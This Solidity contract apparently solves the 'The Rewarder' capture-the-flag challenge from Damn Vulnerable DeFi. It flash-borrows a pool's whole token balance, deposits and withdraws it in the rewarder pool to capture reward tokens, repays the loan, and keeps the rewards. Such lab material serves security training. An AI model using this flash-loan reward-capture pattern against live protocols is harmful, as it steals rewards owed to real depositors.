// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "./RewardToken.sol";
import "./../DamnValuableToken.sol";

contract TheRewarderExploit {
    FlashLoanerPool public flashLoanPool;
    TheRewarderPool public rewarderPool;
    DamnValuableToken public dvt;
    RewardToken public reward;

    constructor(address _flashLoanPool, address _rewarderPool, address _dvt, address _reward) {
        flashLoanPool = FlashLoanerPool(_flashLoanPool);
        rewarderPool = TheRewarderPool(_rewarderPool);
        dvt = DamnValuableToken(_dvt);
        reward = RewardToken(_reward);
    }

    receive() external payable {}
    
    function attack() external {
        flashLoanPool.flashLoan(dvt.balanceOf(address(flashLoanPool)));
        reward.transfer(msg.sender, reward.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external {
        dvt.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        dvt.transfer(address(flashLoanPool), amount);
    }
}